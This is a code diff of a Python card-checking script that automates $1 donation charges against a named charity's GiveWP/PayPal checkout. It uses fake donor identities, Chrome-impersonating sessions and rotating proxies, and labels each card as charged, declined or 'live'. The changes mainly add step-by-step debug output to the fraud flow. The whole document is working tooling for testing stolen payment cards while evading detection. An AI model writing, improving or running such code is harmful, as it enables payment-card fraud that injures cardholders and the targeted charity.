@@ -6,7 +6,7 @@ import secrets
 import uuid
 from faker import Faker
 from curl_cffi.requests import AsyncSession
-from proxy_manager import get_next_proxy   # استيراد الدالة المطلوبة
+from proxy_manager import get_next_proxy
 
 fake = Faker("en_US")
 
@@ -51,12 +51,6 @@ class tools:
             "phone": fake.phone_number(),
         }
 
-    @staticmethod
-    def get_card_type(cc_first: str) -> str:
-        if not cc_first:
-            return "visa"
-        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")
-
 RESPONSE_MAP = {
     "true": ("Success", "Charged - $1 ! ✅", True),
     "sucsess": ("Success", "Charged - $1 ! ✅", True),
@@ -94,9 +88,12 @@ class Gateway:
     async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
         token = secrets.token_hex(16)
 
-        async with AsyncSession(impersonate="chrome", proxies=proxies) as session:
+        async with AsyncSession(impersonate="chrome120", proxies=proxies) as session:
             try:
+                # ----------------------------------------------------
                 # Step 1: GET donation page
+                # ----------------------------------------------------
+                print("\n[🌐 Step 1] Requesting Donation Page...")
                 headers_init = {
                     "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                 }
@@ -104,24 +101,41 @@ class Gateway:
                     "https://bukjeh.org/donations/donation-2023-2-3/",
                     headers=headers_init,
                 )
+                print(f"   ├─ Status Code: {resp_init.status_code}")
+                
                 html = resp_init.text
                 hash_val = tools.find_between(html, 'name="give-form-hash" value="', '"')
                 pre = tools.find_between(html, 'name="give-form-id-prefix" value="', '"')
                 give = tools.find_between(html, 'name="give-form-id" value="', '"')
+
+                print(f"   ├─ Hash: {hash_val}")
+                print(f"   ├─ Prefix: {pre}")
+                print(f"   └─ Give ID: {give}")
+
                 if not hash_val or not pre or not give:
+                    print("   ❌ [Error in Step 1] Could not parse form fields from HTML.")
+                    print(f"   └─ HTML Preview (First 300 chars): {html[:300].strip()}")
                     return "Error", "Missing form parameters", False
 
                 enc_match = re.search(r'"data-client-token":"(.*?)"', html)
                 if not enc_match:
+                    print("   ❌ [Error in Step 1] data-client-token not found.")
                     return "Error", "data-client-token not found", False
+                
                 enc = enc_match.group(1)
                 dec = base64.b64decode(enc).decode("utf-8")
                 au_match = re.search(r'"accessToken":"(.*?)"', dec)
                 if not au_match:
+                    print("   ❌ [Error in Step 1] accessToken not found.")
                     return "Error", "accessToken not found", False
+                
                 au = au_match.group(1)
+                print(f"   └─ AccessToken Extracted Successfully! ({au[:15]}...)")
 
-                # Step 2: First AJAX - give_process_donation (urlencoded)
+                # ----------------------------------------------------
+                # Step 2: First AJAX - give_process_donation
+                # ----------------------------------------------------
+                print("\n[⚡ Step 2] Sending give_process_donation...")
                 headers_ajax1 = {
                     "origin": "https://bukjeh.org",
                     "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
@@ -160,13 +174,18 @@ class Gateway:
                     "action": "give_process_donation",
                     "give_ajax": "true",
                 }
-                await session.post(
+                resp_ajax1 = await session.post(
                     "https://bukjeh.org/wp-admin/admin-ajax.php",
                     headers=headers_ajax1,
                     data=data_ajax1,
                 )
+                print(f"   ├─ Status Code: {resp_ajax1.status_code}")
+                print(f"   └─ Response: {resp_ajax1.text[:200]}")
 
-                # Step 3: Second AJAX - create order (multipart/form-data via files)
+                # ----------------------------------------------------
+                # Step 3: Second AJAX - create order
+                # ----------------------------------------------------
+                print("\n[⚡ Step 3] Creating PayPal Order (create_order)...")
                 headers_ajax2 = {
                     "origin": "https://bukjeh.org",
                     "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
@@ -210,12 +229,25 @@ class Gateway:
                     headers=headers_ajax2,
                     files=files_ajax2,
                 )
-                ajax2_json = resp_ajax2.json()
-                order_id = ajax2_json.get("data", {}).get("id")
+                print(f"   ├─ Status Code: {resp_ajax2.status_code}")
+                print(f"   └─ Response Text: {resp_ajax2.text}")
+
+                try:
+                    ajax2_json = resp_ajax2.json()
+                    order_id = ajax2_json.get("data", {}).get("id")
+                except Exception:
+                    order_id = None
+
                 if not order_id:
+                    print("   ❌ [Error in Step 3] Failed to get order_id.")
                     return "Error", "Failed to create PayPal order", False
 
+                print(f"   └─ Order ID Created: {order_id}")
+
+                # ----------------------------------------------------
                 # Step 4: Confirm payment source via PayPal
+                # ----------------------------------------------------
+                print("\n[💳 Step 4] Confirming Payment with PayPal API...")
                 headers_paypal = {
                     "authorization": f"Bearer {au}",
                     "origin": "https://assets.braintreegateway.com",
@@ -245,9 +277,15 @@ class Gateway:
                     headers=headers_paypal,
                     json=json_paypal,
                 )
+                print(f"   ├─ Status Code: {resp_paypal.status_code}")
+                print(f"   └─ Response: {resp_paypal.text[:250]}")
+                
                 paypal_text = resp_paypal.text.lower()
 
-                # Step 5: Third AJAX - approve order (multipart/form-data via files)
+                # ----------------------------------------------------
+                # Step 5: Third AJAX - approve order
+                # ----------------------------------------------------
+                print("\n[⚡ Step 5] Approving Order (approve_order)...")
                 headers_ajax3 = {
                     "origin": "https://bukjeh.org",
                     "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
@@ -292,27 +330,28 @@ class Gateway:
                     headers=headers_ajax3,
                     files=files_ajax3,
                 )
-                approve_text = resp_ajax3.text.lower()
+                print(f"   ├─ Status Code: {resp_ajax3.status_code}")
+                print(f"   └─ Response: {resp_ajax3.text}")
 
-                # Combine both responses for classification
+                approve_text = resp_ajax3.text.lower()
                 combined = paypal_text + " " + approve_text
 
                 for key, (status, msg, is_live) in RESPONSE_MAP.items():
                     if key in combined:
                         return status, msg, is_live
 
-                # Fallback: try JSON error extraction
                 try:
                     error_data = resp_ajax3.json()
                     if 'data' in error_data and 'error' in error_data['data']:
                         err_msg = error_data['data']['error']
                         return "Declined", f"{err_msg} ❌", False
-                except:
+                except Exception:
                     pass
 
                 return "Unknown", "Unrecognised response ❓", False
 
             except Exception as e:
+                print(f"\n❌ [Exception Captured]: {str(e)}")
                 return "Error", f"Exception: {str(e)}", False
 
 
@@ -324,6 +363,7 @@ async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, 
     max_attempts = 5
 
     for attempt in range(max_attempts):
+        print(f"\n==================== Attempt {attempt + 1}/{max_attempts} ====================")
         user_data = tools.userdata()
         proxy_url_new = get_next_proxy()
         proxies = {"http": proxy_url_new, "https": proxy_url_new} if proxy_url_new else None
@@ -353,7 +393,7 @@ async def main():
 
     status, message, is_live = await process_paypal_1(test_card, proxy_url=proxy)
 
-    print("\n--- Execution Result ---")
+    print("\n---------------- FINAL RESULT ----------------")
     print(f"Status  : {status}")
     print(f"Message : {message}")
     print(f"Live    : {is_live}")
